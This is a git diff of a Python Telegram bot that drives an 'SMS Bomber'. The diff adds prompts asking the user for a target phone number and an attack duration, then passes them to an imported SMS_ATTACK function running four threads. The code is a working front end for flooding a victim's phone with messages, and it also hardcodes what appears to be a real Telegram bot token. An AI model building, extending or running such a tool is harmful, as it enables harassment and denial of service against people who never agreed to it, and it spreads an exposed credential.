@@ -3,31 +3,42 @@ import telebot
 bot = telebot.TeleBot('1410709159:AAEkzgIGWDAX849tB3MFWoo4oPxjqW2xxlI')
 
 
-def extract_arg(arg):
-    return arg.split()[1]
-
-
-def extract_arg2(arg2):
-    return arg2.split()[2]
-
-
 @bot.message_handler(commands=['start'])
 def start(message):
-    start = 'To start SMS Bomber type /bomber number time(in seconds)' \
-            '\nFor example /bomber +48123456789 60'
+    start = 'To start SMS Bomber type /bomber'
     bot.send_message(message.chat.id, start)
 
 
-@bot.message_handler(commands=['bomber'])
-def bomber(message):
-    status = extract_arg(message.text)
-    status2 = extract_arg2(message.text)
-    time_integer = int(status2)
+number = ''
+time = 0
+@bot.message_handler(content_types=['text'])
+def start(message):
+    if message.text == '/bomber':
+        bot.send_message(message.from_user.id, 'Input target number:')
+        bot.register_next_step_handler(message, get_number)
+    else:
+        bot.send_message(message.from_user.id, 'Type /bomber')
+
+
+def get_number(message):
+    global number
+    number = message.text
+    bot.send_message(message.from_user.id, 'Input attack time:')
+    bot.register_next_step_handler(message, get_time)
+
+
+def get_time(message):
+    global time
+    time = message.text
+    time_integer = int(time)
     time = time_integer
+    main()
+
+
+def main():
     threads = 4
-    target = status
     from SMS.main import SMS_ATTACK
-    SMS_ATTACK(threads, time, target)
+    SMS_ATTACK(threads, time, number)
 
 
 bot.polling()
